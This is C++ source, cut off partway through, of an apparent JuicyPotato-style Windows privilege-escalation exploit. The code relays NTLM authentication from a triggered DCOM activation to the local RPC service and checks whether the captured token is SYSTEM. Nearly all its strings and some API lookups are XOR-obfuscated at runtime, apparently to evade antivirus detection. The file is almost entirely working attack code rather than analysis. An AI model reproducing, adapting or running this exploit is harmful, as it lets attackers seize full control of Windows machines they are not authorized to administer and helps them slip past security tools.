#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <userenv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <winsafer.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
char dcom_port[12];
char dcom_ip[17];

static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;

int IsTokenSystem(HANDLE tok)
{
	
	 char  hid__S__S__RuTexjLkkSvv[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
 char k_hMxckBTd6e5J = '\x45';
for(int i = 0; i < sizeof(hid__S__S__RuTexjLkkSvv) / sizeof(hid__S__S__RuTexjLkkSvv[0]); i++){
hid__S__S__RuTexjLkkSvv[i] = hid__S__S__RuTexjLkkSvv[i] ^ k_hMxckBTd6e5J;
}

	 wchar_t  hid_S_Y_S__ywQC4MuMYOTc[] = {'\x16','\x1c','\x16','\x11','\x0','\x8','\x45'};
 wchar_t k_7Sco7vSFHGUZ = '\x45';
for(int i = 0; i < sizeof(hid_S_Y_S__ywQC4MuMYOTc) / sizeof(hid_S_Y_S__ywQC4MuMYOTc[0]); i++){
hid_S_Y_S__ywQC4MuMYOTc[i] = hid_S_Y_S__ywQC4MuMYOTc[i] ^ k_7Sco7vSFHGUZ;
}
	typedef bool(__stdcall* _GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
	TCHAR  hid_Advapi_Xy6nuF1pUO2P[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_RsOu74R7nxVs = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_Xy6nuF1pUO2P) / sizeof(hid_Advapi_Xy6nuF1pUO2P[0]); i++){
hid_Advapi_Xy6nuF1pUO2P[i] = hid_Advapi_Xy6nuF1pUO2P[i] ^ k_RsOu74R7nxVs;
}

	HMODULE hid_hHandl_rJcmV3D3REW6 = LoadLibrary(hid_Advapi_Xy6nuF1pUO2P);
	char  hid_GetTok_O01AAyvsthFE[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_O962Lx8Cd0D9 = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_O01AAyvsthFE) / sizeof(hid_GetTok_O01AAyvsthFE[0]); i++){
hid_GetTok_O01AAyvsthFE[i] = hid_GetTok_O01AAyvsthFE[i] ^ k_O962Lx8Cd0D9;
}

	_GetTokenInformation hid_GetTok_xG8XeKcQEYx6 = (_GetTokenInformation) GetProcAddress(hid_hHandl_rJcmV3D3REW6, hid_GetTok_O01AAyvsthFE);
	TCHAR  hid_Advapi_bD0tR4ym19QB[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_9MgTXQUqu0NQ = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_bD0tR4ym19QB) / sizeof(hid_Advapi_bD0tR4ym19QB[0]); i++){
hid_Advapi_bD0tR4ym19QB[i] = hid_Advapi_bD0tR4ym19QB[i] ^ k_9MgTXQUqu0NQ;
}

	HMODULE hid_hHandl_2ZLTGc5oxMI1 = LoadLibrary(hid_Advapi_bD0tR4ym19QB);
	char  hid_GetTok_oRIOphyeiK7H[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_gOtUGoZ10DXI = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_oRIOphyeiK7H) / sizeof(hid_GetTok_oRIOphyeiK7H[0]); i++){
hid_GetTok_oRIOphyeiK7H[i] = hid_GetTok_oRIOphyeiK7H[i] ^ k_gOtUGoZ10DXI;
}

	_GetTokenInformation hid_GetTok_U5h7oTInjgh9 = (_GetTokenInformation) GetProcAddress(hid_hHandl_2ZLTGc5oxMI1, hid_GetTok_oRIOphyeiK7H);
DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	hid_GetTok_xG8XeKcQEYx6(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	hid_GetTok_U5h7oTInjgh9(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf(hid__S__S__RuTexjLkkSvv, olestr, DomainName, UserName);
	if (!_wcsicmp(UserName, hid_S_Y_S__ywQC4MuMYOTc))
		return 1;

	return 0;
}

void usage()
{
	
	 char  hid_JuicyP_mkvgSsy4DiQ9[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
 char k_msXhA2BkElW1 = '\x45';
for(int i = 0; i < sizeof(hid_JuicyP_mkvgSsy4DiQ9) / sizeof(hid_JuicyP_mkvgSsy4DiQ9[0]); i++){
hid_JuicyP_mkvgSsy4DiQ9[i] = hid_JuicyP_mkvgSsy4DiQ9[i] ^ k_msXhA2BkElW1;
}

	 char  hid_Mandat_iIbTtaEOesyp[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
 char k_GD5bm9MQ6cXF = '\x45';
for(int i = 0; i < sizeof(hid_Mandat_iIbTtaEOesyp) / sizeof(hid_Mandat_iIbTtaEOesyp[0]); i++){
hid_Mandat_iIbTtaEOesyp[i] = hid_Mandat_iIbTtaEOesyp[i] ^ k_GD5bm9MQ6cXF;
}

	 char  hid_Option_pmtU45XT378Q[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
 char k_XRbV5e1qglrB = '\x45';
for(int i = 0; i < sizeof(hid_Option_pmtU45XT378Q) / sizeof(hid_Option_pmtU45XT378Q[0]); i++){
hid_Option_pmtU45XT378Q[i] = hid_Option_pmtU45XT378Q[i] ^ k_XRbV5e1qglrB;
}
printf(hid_JuicyP_mkvgSsy4DiQ9, VERSION);

	printf(hid_Mandat_iIbTtaEOesyp
	);

	printf("\n\n");
	printf(hid_Option_pmtU45XT378Q
	);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char *bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char *bytes, int len) {
	
	 char  hid_Error__JyHJfhSlTCnM[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
 char k_FhSKjCC3eZZG = '\x45';
for(int i = 0; i < sizeof(hid_Error__JyHJfhSlTCnM) / sizeof(hid_Error__JyHJfhSlTCnM[0]); i++){
hid_Error__JyHJfhSlTCnM[i] = hid_Error__JyHJfhSlTCnM[i] ^ k_FhSKjCC3eZZG;
}
int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		case 1:
			//NTLM type 1 message
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 2:
			//NTLM type 2 message
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 3:
			//NTLM type 3 message
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf(hid_Error__JyHJfhSlTCnM);
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	
	 wchar_t  hid________Hw1sRlPMx2jm[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x6','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
 wchar_t k_dDjIJXB39tex = '\x45';
for(int i = 0; i < sizeof(hid________Hw1sRlPMx2jm) / sizeof(hid________Hw1sRlPMx2jm[0]); i++){
hid________Hw1sRlPMx2jm[i] = hid________Hw1sRlPMx2jm[i] ^ k_dDjIJXB39tex;
}
CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(hid________Hw1sRlPMx2jm, &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	
	 char  hid_WSASta_TK5QbMksm1vT[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_YflemtUmMesL = '\x45';
for(int i = 0; i < sizeof(hid_WSASta_TK5QbMksm1vT) / sizeof(hid_WSASta_TK5QbMksm1vT[0]); i++){
hid_WSASta_TK5QbMksm1vT[i] = hid_WSASta_TK5QbMksm1vT[i] ^ k_YflemtUmMesL;
}

	 char  hid________mXvtMmU8m3m4[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char k_8hmG39C2vTCT = '\x45';
for(int i = 0; i < sizeof(hid________mXvtMmU8m3m4) / sizeof(hid________mXvtMmU8m3m4[0]); i++){
hid________mXvtMmU8m3m4[i] = hid________mXvtMmU8m3m4[i] ^ k_8hmG39C2vTCT;
}

	 char  hid_getadd_Z9rRXlFtDFs3[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_A3DD5566pwgs = '\x45';
for(int i = 0; i < sizeof(hid_getadd_Z9rRXlFtDFs3) / sizeof(hid_getadd_Z9rRXlFtDFs3[0]); i++){
hid_getadd_Z9rRXlFtDFs3[i] = hid_getadd_Z9rRXlFtDFs3[i] ^ k_A3DD5566pwgs;
}

	 char  hid_socket_sBjUF65TmXUW[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char k_DWWI5QHtQfDF = '\x45';
for(int i = 0; i < sizeof(hid_socket_sBjUF65TmXUW) / sizeof(hid_socket_sBjUF65TmXUW[0]); i++){
hid_socket_sBjUF65TmXUW[i] = hid_socket_sBjUF65TmXUW[i] ^ k_DWWI5QHtQfDF;
}

	 char  hid_Unable_U9AfYd8N0Dca[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
 char k_BQmYVHIeMSDN = '\x45';
for(int i = 0; i < sizeof(hid_Unable_U9AfYd8N0Dca) / sizeof(hid_Unable_U9AfYd8N0Dca[0]); i++){
hid_Unable_U9AfYd8N0Dca[i] = hid_Unable_U9AfYd8N0Dca[i] ^ k_BQmYVHIeMSDN;
}

	 char  hid_RPC____9KNr7mSNJolL[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_ewNRXctXuHQs = '\x45';
for(int i = 0; i < sizeof(hid_RPC____9KNr7mSNJolL) / sizeof(hid_RPC____9KNr7mSNJolL[0]); i++){
hid_RPC____9KNr7mSNJolL[i] = hid_RPC____9KNr7mSNJolL[i] ^ k_ewNRXctXuHQs;
}

	 char  hid_RPC____H116PDmnHHBX[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
 char k_ZaCJQunihMyF = '\x45';
for(int i = 0; i < sizeof(hid_RPC____H116PDmnHHBX) / sizeof(hid_RPC____H116PDmnHHBX[0]); i++){
hid_RPC____H116PDmnHHBX[i] = hid_RPC____H116PDmnHHBX[i] ^ k_ZaCJQunihMyF;
}

	 char  hid_RPC____jfNKIMrKbYRw[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_CEB0T3JSZjaW = '\x45';
for(int i = 0; i < sizeof(hid_RPC____jfNKIMrKbYRw) / sizeof(hid_RPC____jfNKIMrKbYRw[0]); i++){
hid_RPC____jfNKIMrKbYRw[i] = hid_RPC____jfNKIMrKbYRw[i] ^ k_CEB0T3JSZjaW;
}
const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_TK5QbMksm1vT, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, hid________mXvtMmU8m3m4);
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf(hid_getadd_Z9rRXlFtDFs3, iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf(hid_socket_sBjUF65TmXUW, WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf(hid_Unable_U9AfYd8N0Dca);
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf(hid_RPC____9KNr7mSNJolL, WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf(hid_RPC____H116PDmnHHBX);
		}
		else {
			printf(hid_RPC____jfNKIMrKbYRw, WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	
	 char  hid_WSASta_ly9y2zL5DyrZ[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_AmDQPUoQr9Ld = '\x45';
for(int i = 0; i < sizeof(hid_WSASta_ly9y2zL5DyrZ) / sizeof(hid_WSASta_ly9y2zL5DyrZ[0]); i++){
hid_WSASta_ly9y2zL5DyrZ[i] = hid_WSASta_ly9y2zL5DyrZ[i] ^ k_AmDQPUoQr9Ld;
}

	 char  hid_getadd_y0nhg9NtQ0Lx[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_xrYMHSIiwkb3 = '\x45';
for(int i = 0; i < sizeof(hid_getadd_y0nhg9NtQ0Lx) / sizeof(hid_getadd_y0nhg9NtQ0Lx[0]); i++){
hid_getadd_y0nhg9NtQ0Lx[i] = hid_getadd_y0nhg9NtQ0Lx[i] ^ k_xrYMHSIiwkb3;
}

	 char  hid_socket_qkiOpEJGAHVD[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char k_tvtSOFvUlcS0 = '\x45';
for(int i = 0; i < sizeof(hid_socket_qkiOpEJGAHVD) / sizeof(hid_socket_qkiOpEJGAHVD[0]); i++){
hid_socket_qkiOpEJGAHVD[i] = hid_socket_qkiOpEJGAHVD[i] ^ k_tvtSOFvUlcS0;
}

	 char  hid_bind_f_ElObIXg0G61D[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_Um1ebjSC8lx7 = '\x45';
for(int i = 0; i < sizeof(hid_bind_f_ElObIXg0G61D) / sizeof(hid_bind_f_ElObIXg0G61D[0]); i++){
hid_bind_f_ElObIXg0G61D[i] = hid_bind_f_ElObIXg0G61D[i] ^ k_Um1ebjSC8lx7;
}

	 char  hid_listen_ZEbVMmXAGsvv[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_pPReQuR2Q1bb = '\x45';
for(int i = 0; i < sizeof(hid_listen_ZEbVMmXAGsvv) / sizeof(hid_listen_ZEbVMmXAGsvv[0]); i++){
hid_listen_ZEbVMmXAGsvv[i] = hid_listen_ZEbVMmXAGsvv[i] ^ k_pPReQuR2Q1bb;
}

	 char  hid_accept_Z9v1XAuQtoQh[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_p1M1iXg7x4I2 = '\x45';
for(int i = 0; i < sizeof(hid_accept_Z9v1XAuQtoQh) / sizeof(hid_accept_Z9v1XAuQtoQh[0]); i++){
hid_accept_Z9v1XAuQtoQh[i] = hid_accept_Z9v1XAuQtoQh[i] ^ k_p1M1iXg7x4I2;
}

	 char  hid_COM____EWuqNrmtlOzb[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_VdiyqO71sGGG = '\x45';
for(int i = 0; i < sizeof(hid_COM____EWuqNrmtlOzb) / sizeof(hid_COM____EWuqNrmtlOzb[0]); i++){
hid_COM____EWuqNrmtlOzb[i] = hid_COM____EWuqNrmtlOzb[i] ^ k_VdiyqO71sGGG;
}

	 char  hid_COM____tZ7d8CmCnMhg[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_u7Db0WtDdAnm = '\x45';
for(int i = 0; i < sizeof(hid_COM____tZ7d8CmCnMhg) / sizeof(hid_COM____tZ7d8CmCnMhg[0]); i++){
hid_COM____tZ7d8CmCnMhg[i] = hid_COM____tZ7d8CmCnMhg[i] ^ k_u7Db0WtDdAnm;
}

